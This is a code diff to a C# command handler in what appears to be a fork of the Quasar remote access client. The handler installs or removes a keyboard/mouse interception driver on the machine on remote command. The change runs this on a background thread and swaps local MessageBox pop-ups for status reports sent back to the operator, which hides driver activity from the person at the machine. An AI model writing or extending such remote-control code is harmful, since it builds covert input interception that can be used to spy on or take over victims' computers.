@@ -4,7 +4,6 @@ using System;
 using System.Threading;
 
 using Quasar.Client.Interception;
-using System.Windows.Forms;
 
 using InputInterceptorNS;
 
@@ -28,24 +27,28 @@ namespace Quasar.Client.Messages
 
         public void Execute(ISender client, KBMDriverCommand message)
         {
-            switch (message.action)
+            new Thread(delegate ()
             {
-                case "install":
-                    InstallDriver();
-                    break;
-                case "uninstall":
-                    UninstallDriver();
-                    break;
-                case "driverinit":
-                    InterceptionHelper.InitializeDriver();
-                    break;
-                default:
-                    break;
-            }
+                switch (message.action)
+                {
+                    case "install":
+                        InstallDriver(client);
+                        break;
+                    case "uninstall":
+                        UninstallDriver(client);
+                        break;
+                    case "driverinit":
+                        InterceptionHelper.InitializeDriver(client);
+                        break;
+                    default:
+                        break;
+                }
+            }).Start();
+            
            // client.Send(new SetStatus { Message = "Successfully displayed MessageBox" });
         }
 
-        private void InstallDriver()
+        private void InstallDriver(ISender client)
         {
             bool alreadyInstalled;
             string stdout = "";
@@ -56,20 +59,20 @@ namespace Quasar.Client.Messages
 
             if (alreadyInstalled)
             {
-                MessageBox.Show("Driver is already installed");
+                client.Send(new SetStatus { Message = "KB/M driver is already installed!" });
                 return;
             }
             string tempText = "";
             if (stdout.Length > 0)
                 tempText += stdout;
-            tempText += "------\n";
+            tempText += "--------\n";
             if (stderr.Length > 0)
                 tempText += stderr;
-            MessageBox.Show(tempText);
+            client.Send(new SetStatus { Message = tempText });
             return;
         }
 
-        private void UninstallDriver()
+        private void UninstallDriver(ISender client)
         {
             bool flag11;
             string text23;
@@ -80,7 +83,7 @@ namespace Quasar.Client.Messages
             //InterceptionHelper.UninstallInterception(out flag11, out text23, out text24);
             if (flag11)
             {
-                MessageBox.Show("Driver is currently not installed");
+                client.Send(new SetStatus { Message = "Driver is currently not installed!" });
                 return;
             }
             string text25 = "";
@@ -88,12 +91,13 @@ namespace Quasar.Client.Messages
             {
                 text25 += text23;
             }
-            text25 += "--------------\n";
+            text25 += "--------\n";
             if (text24.Length > 0)
             {
                 text25 += text24;
             }
-            MessageBox.Show(text25);
+            client.Send(new SetStatus { Message = text25 });
+
             return;
         }
 
